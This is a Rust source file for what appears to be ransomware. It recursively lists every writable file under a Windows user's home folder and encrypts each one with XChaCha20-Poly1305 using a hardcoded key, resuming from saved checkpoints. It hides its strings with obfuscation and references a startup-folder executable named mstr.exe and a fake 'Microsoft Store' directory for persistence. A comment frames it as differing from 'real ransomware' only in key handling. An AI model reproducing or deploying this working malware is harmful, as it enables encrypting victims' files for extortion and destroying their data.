use std::{fs, fs::File};
use std::path::PathBuf;
use std::io::{BufRead, BufReader, ErrorKind, Write};

#[warn(unreachable_code)]
#[path = "encrpt.rs"] mod encrpt; // import a module from a separate file named `encrpt.rs`
use encrpt::{XChaCha20Poly1305Encryptor, FileEncryptor};


// function to recursively list files in a directory and write non-read-only files' paths to a log file
fn list_files(path: &std::path::Path, log_dir: &std::path::Path) -> Result<(), String> {
    if path.is_dir() {
        for entry in match fs::read_dir(path) { // read directory contents and iterate over them
            std::result::Result::Ok(e) => e, // if no errors occurred, return the value of `e`
            Err(_e) => return Err("()".to_string()) // if an error occurred, return an error string
        } {
            let entry = entry.expect(obfstr::obfstr!("Unknown error."));
            let path = entry.path();
            if path.is_dir() { // if a directory is encountered, recursively call the function on it
                match list_files(&path, &log_dir){
                    _ => ()
                };                    
            } else { // if a file is encountered, check if it is not read-only and write its path to the log file
                println!("{}", path.display());
                let path_display = path.display().to_string();
                let metadata = match fs::metadata(&path_display) {
                    std::result::Result::Ok(e) => e,
                    Err(_e) => return Err("to".to_string())
                };
                let permissions = metadata.permissions().readonly();
                if permissions == false {
                    println!("\n\n\nperm: {}\n\n\n", permissions);
                    let mut file = std::fs::OpenOptions::new()
                        .append(true) // open the file in append mode
                        .open(log_dir) // open the log file
                        .unwrap(); // exit if there is an error

                    let direct = format!("{}\n", &path_display);
                    file.write(direct.as_bytes()).unwrap(); // write the file path to the log file
                    file.flush().unwrap();
                }  
            }
        }
    }
    std::result::Result::Ok(())
}   




pub fn execute() -> Result<(), String> { 

        //In a real ransomware code, the key is randomly generated. This generated key is saved on the server. In this way, when the application is opened for the first time on a new system, a random key is generated.



        // Define a 32-byte (256-bit) constant key.
        let large_file_key = [0x6a, 0x72, 0x65, 0x6d, 0x20, 0x69, 0x75, 0x73, 0x75, 0x6d, 0x20, 0x64, 0x6f, 0x6c, 0x6f, 0x72, 0x20, 0x72, 0x69, 0x74, 0x20, 0x61, 0x6d, 0x65, 0x74, 0x2c, 0x20, 0x63, 0x6c, 0x6e, 0x73, 0x35];

        // Define a 19-byte (152-bit) constant nonce value.
        let large_file_nonce = [0x49, 0x76, 0x61, 0x6e, 0x20, 0x42, 0x61, 0x63, 0x61, 0x6b, 0x31, 0x49, 0x6e, 0x63, 0x65, 0x6c, 0x69, 0x6b, 0x40];



        // Get the current user's username.
        let username = whoami::username();
    
        // Construct the file names for the "all files" and "last" temporary files.
        let all_file_name = format!("{}{}", sha256::digest(format!("{}{}", username, obfstr::obfstr!("all_files"))), obfstr::obfstr!(".tmp"));
        let last_file_name = format!("{}{}", sha256::digest(format!("{}{}", username, obfstr::obfstr!("last"))), obfstr::obfstr!(".tmp"));
    
        // Construct the paths to the "all files" and "last" temporary files.
        let current_dir = PathBuf::from(r"C:\Users\".to_owned() + username.as_str());
        let path_dest = PathBuf::from(current_dir.display().to_string() + obfstr::obfstr!(r"\AppData\Local\Temp\") + all_file_name.as_str());
        let last_dest = PathBuf::from(current_dir.display().to_string()  + obfstr::obfstr!(r"\AppData\Local\Temp\") + last_file_name.as_str());
        let last_decry_path = PathBuf::from(current_dir.display().to_string() + obfstr::obfstr!(r"\AppData\Local\Temp\last_decode.tmp"));
        // Try to open the encoded.txt file.
        match File::open(&PathBuf::from(current_dir.display().to_string()  + obfstr::obfstr!(r"\AppData\Local\Temp\encoded.txt"))) {
            // If the file was successfully opened...
            std::result::Result::Ok(_file) => {
                // Try to open the "all files" temporary file.
                let path_file = match File::open(&path_dest) {
                    // If the file was successfully opened...
                    std::result::Result::Ok(file) => file,
                    // If there was an error opening the file, return an error.
                    Err(_error) => return Err(obfstr::obfstr!("Decode Problem").to_string())
                };    
        
                let path_metadata = match path_file.metadata() {
                    std::result::Result::Ok(metadata) => metadata,
                    Err(_error) => {
                        return Err(obfstr::obfstr!("Decode Problem").to_string());
                    }
                };

                match path_metadata.len(){
                    // If the length is 0, list files in the directory and write the list to the file
                    0 =>  list_files(&current_dir, &path_dest)?,
                    // Otherwise, print "Already Have !"
                    _ => println!("{}", obfstr::obfstr!("Already Have !")),
                }
            
        
            // Open the last destination file for reading and create a buffer
            let last_file = match File::open(&last_decry_path) {
                std::result::Result::Ok(file) => file,
                Err(error) => {
                    if error.kind() == ErrorKind::NotFound {
                        println!("{}", obfstr::obfstr!("File not found. Creating..."));
                        let mut file = File::create(&last_decry_path).expect(obfstr::obfstr!("Can't created."));
                        match file.write_all("".as_bytes()){_ => ()};
                        match file.flush(){_ => ()};
                        file
                    } else {
                        println!("Something happened:  {:?}", error);
                        return Err(obfstr::obfstr!("Unknown Error").to_string());
                    }
                }
            };

            
        
            let last_metadata = match last_file.metadata() { //Gets files metadata
                std::result::Result::Ok(metadata) => metadata,
                Err(error) => {
                    println!("Something happened:  {:?}", error);
                    return Err(obfstr::obfstr!("Metadata Error").to_string());
                }
            };
        
        
           
            // Checks last decryption file, if it is a null file, decryption starts from beginning.
            match last_metadata.len(){
                0 | 1 =>  {
                    // Open the file for reading and create a buffer
                    let logs = BufReader::new(path_file);

                    // Loop over each line in the file
                    for line in logs.lines() {
                        // Get the text from the line
                        let text = line.unwrap();

                        // If the line contains certain substrings, do nothing
                        if text.clone().contains(&all_file_name) || text.clone().contains(&last_file_name) || text.clone().contains(obfstr::obfstr!("d3c12.dll"))  || text.clone().contains(obfstr::obfstr!("mstr.exe")){
                            // Do nothing
                        }
                        else {
                            println!("Decrypting {text}");
                            let decrptor = XChaCha20Poly1305Encryptor {
                                key: &large_file_key,
                                nonce: &large_file_nonce,
                            };
                            
                            match decrptor.decrypt_large_file(&text, &last_decry_path.display().to_string()){
                                std::result::Result::Ok(_e) => println!("Success"),
                                Err(_e) => println!("{}", obfstr::obfstr!("Decryption Error"))
                            };
                        }
                    }
                    // Remove several files and directories
                    match std::fs::remove_file(PathBuf::from(current_dir.display().to_string()  + obfstr::obfstr!(r"\AppData\Local\Temp\encoded.txt"))){
                        _ => ()
                    };

                    match std::fs::remove_file(&path_dest){
                        _ => ()
                    };

                    match std::fs::remove_file(&last_dest){
                        _ => ()
                    };

                    match std::fs::remove_file(&last_decry_path){
                        _ => ()
                    };

                    match std::fs::remove_dir_all("C:\\Users\\".to_owned() + whoami::username().as_str() + obfstr::obfstr!("\\AppData\\Local\\Programs\\Microsoft Store")){
                        _ => ()
                    };

                    match std::fs::remove_file(r"C:\Users\".to_owned() + whoami::username().as_str() + obfstr::obfstr!(r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mstr.exe")){
                        _ => ()
                    };
                    
                },
                _ => { // Checks last decryption file, if it isn't a null file, It starts from where it was before.
                    let logs = BufReader::new(path_file);
                    let last_direc = fs::read_to_string(&last_decry_path).expect(obfstr::obfstr!("Should have been able to read the file"));
        
                    
                    let mut found = false;
        
                    for line in logs.lines() {
                        let text = line.unwrap();
        
                        if found {
                            println!("{}", text);
                            if text.clone().contains(&all_file_name) || text.clone().contains(&last_file_name) || text.clone().contains(obfstr::obfstr!("d3c12.dll"))  || text.clone().contains(obfstr::obfstr!("mstr.exe")){
                               
                            }
                            else {
                                println!("Decrypting {text}");
                                let decrptor = XChaCha20Poly1305Encryptor {
                                    key: &large_file_key,
                                    nonce: &large_file_nonce,
                                };
                                
                                match decrptor.decrypt_large_file(&text, &last_decry_path.display().to_string()){
                                    std::result::Result::Ok(_e) => println!("Success"),
                                    Err(_e) => println!("{}", obfstr::obfstr!("Decryption Error"))
                                };
                            }
                                  
                        }
        
                        if text.contains(last_direc.as_str()) {
                            found = true;
                        }
                    }
                   // Remove several files and directories
                   match std::fs::remove_file(PathBuf::from(current_dir.display().to_string()  + obfstr::obfstr!(r"\AppData\Local\Temp\encoded.txt"))){
                    _ => ()
                    };

                    match std::fs::remove_file(&path_dest){
                        _ => ()
                    };

                    match std::fs::remove_file(&last_dest){
                        _ => ()
                    };

                    match std::fs::remove_file(&last_decry_path){
                        _ => ()
                    };

                    match std::fs::remove_dir_all("C:\\Users\\".to_owned() + whoami::username().as_str() + obfstr::obfstr!("\\AppData\\Local\\Programs\\Microsoft Store")){
                        _ => ()
                    };

                    match std::fs::remove_file(r"C:\Users\".to_owned() + whoami::username().as_str() + obfstr::obfstr!(r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mstr.exe")){
                        _ => ()
                    };
                },
            };
        },
        Err(error) => {
            if error.kind() == ErrorKind::NotFound {
                // If the file is not found, create it
                let path_file = match File::open(&path_dest) {
                    std::result::Result::Ok(file) => file,
                    Err(error) => {
                        if error.kind() == ErrorKind::NotFound {
                            println!("{}", obfstr::obfstr!("File not found. Creating..."));
                            let mut file = File::create(&path_dest).expect(obfstr::obfstr!("Can't created."));
                            match file.write_all("".as_bytes()){_ => ()};
                            match file.flush(){_ => ()};
                            file
                        } else {
                            // If there is an error, return an error message
                            println!("Something happened:  {:?}", error);
                            return Err("Unknown Error".to_string());
                        }
                    }
                };

                // Get the metadata for the file
                let path_metadata = match path_file.metadata() {
                    std::result::Result::Ok(metadata) => metadata,
                    Err(error) => {
                        println!("Something happened:  {:?}", error);
                        return Err("Metadata Error".to_string());
                    }
                };
            
            
                // Check the length of the metadata
                match path_metadata.len(){
                    // If the length is 0, list files in the directory and write the list to the file
                    0 =>  list_files(&current_dir, &path_dest)?,
                    // Otherwise, print "Already Have !"
                    _ => println!("{}", obfstr::obfstr!("Already Have !")),
                }
            
                // Open the last destination file for reading and create a buffer
                let last_file = match File::open(&last_dest) {
                    std::result::Result::Ok(file) => file,
                    Err(error) => {
                        if error.kind() == ErrorKind::NotFound {
                            println!("{}", obfstr::obfstr!("File not found. Creating..."));
                            let mut file = File::create(&last_dest).expect(obfstr::obfstr!("Can't created."));
                            match file.write_all("".as_bytes()){_ => ()};
                            match file.flush(){_ => ()};
                            file
                        } else {
                            println!("Something happened:  {:?}", error);
                            return Err(obfstr::obfstr!("Unknown Error").to_string());
                        }
                    }
                };
            
                let last_metadata = match last_file.metadata() { //Gets files metadata
                    std::result::Result::Ok(metadata) => metadata,
                    Err(error) => {
                        println!("Something happened:  {:?}", error);
                        return Err(obfstr::obfstr!("Metadata Error").to_string());
                    }
                };
            
            
               

                match last_metadata.len(){
                    0 | 1 =>  { // Checks last encryption file, if it is a null file, decryption starts from beginning.
                        // Open the file for reading and create a buffer
                        let logs = BufReader::new(path_file);

                        // Loop over each line in the file
                        for line in logs.lines() {
                            // Get the text from the line
                            let text = line.unwrap();

                            // If the line contains certain substrings, do nothing
                            if text.clone().contains(&all_file_name) || text.clone().contains(&last_file_name) || text.clone().contains(obfstr::obfstr!("d3c12.dll"))  || text.clone().contains(obfstr::obfstr!("mstr.exe")){
                                // Do nothing
                            }
                            else {
                                println!("Encrypting {text}");
                                let encryptor = XChaCha20Poly1305Encryptor {
                                    key: &large_file_key,
                                    nonce: &large_file_nonce,
                                };
                                
                                match encryptor.encrypt_file(&text, &last_dest.display().to_string()){
                                    std::result::Result::Ok(_e) => println!("Success"),
                                    Err(_e) => println!("{}", obfstr::obfstr!("Encryption Error"))
                                };
                            }
                        }
                        // Remove several files and directories
                        match std::fs::write(PathBuf::from(current_dir.display().to_string()  + obfstr::obfstr!(r"\AppData\Local\Temp\encoded.txt")), ""){
                            _ => ()
                        };
                    },
                    _ => {// Checks last encryption file, if it isn't a null file, It starts from where it was before.
                        let logs = BufReader::new(path_file);
                        let last_direc = fs::read_to_string(&last_dest).expect(obfstr::obfstr!("Should have been able to read the file"));
            
                        
                        let mut found = false;
            
                        for line in logs.lines() {
                            let text = line.unwrap();
            
                            if found {
                                println!("{}", text);
                                if text.clone().contains(&all_file_name) || text.clone().contains(&last_file_name) || text.clone().contains(obfstr::obfstr!("d3c12.dll"))  || text.clone().contains(obfstr::obfstr!("mstr.exe")){
                                   
                                }
                                else {
                                    let encryptor = XChaCha20Poly1305Encryptor {
                                        key: &large_file_key,
                                        nonce: &large_file_nonce,
                                    };
                                    
                                    match encryptor.encrypt_file(&text, &last_dest.display().to_string()){
                                        std::result::Result::Ok(_e) => println!("Success"),
                                        Err(_e) => println!("{}", obfstr::obfstr!("Encryption Error"))
                                    }; 
                                }
                                      
                            }
            
                            if text.contains(last_direc.as_str()) {
                                found = true;
                            }
                        }
                        match std::fs::write(PathBuf::from(current_dir.display().to_string()  + obfstr::obfstr!(r"\AppData\Local\Temp\encoded.txt")), ""){
                            _ => ()
                        };
                    },
                };
            
            } 
            else {
                println!("Something happened:  {:?}", error);
                return Err(obfstr::obfstr!("Unknown Error").to_string());
            }
        }
    };
    
    

    

    std::result::Result::Ok(())
}